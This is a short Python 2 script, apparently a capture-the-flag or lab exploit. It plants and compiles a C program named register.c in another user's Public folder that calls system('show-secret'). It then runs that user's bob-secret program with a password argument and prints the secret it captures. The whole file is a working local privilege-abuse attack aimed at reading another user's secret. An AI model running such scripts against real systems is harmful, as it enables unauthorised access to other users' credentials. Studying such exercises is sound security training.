import os

file = open("/home/bob/Public/register.c", "w");
file.write("#include <stdio.h>\nint main()\n{\n\tsystem(\"show-secret\");\n\treturn 0;\n}")
file.close()
os.system("gcc /home/bob/Public/register.c -o /home/bob/Public/register")
os.system("echo 'y' | /home/bob/Public/bob-secret password > secret.txt")
with open('secret.txt', 'r') as f:
        secret = f.readline()
print secret
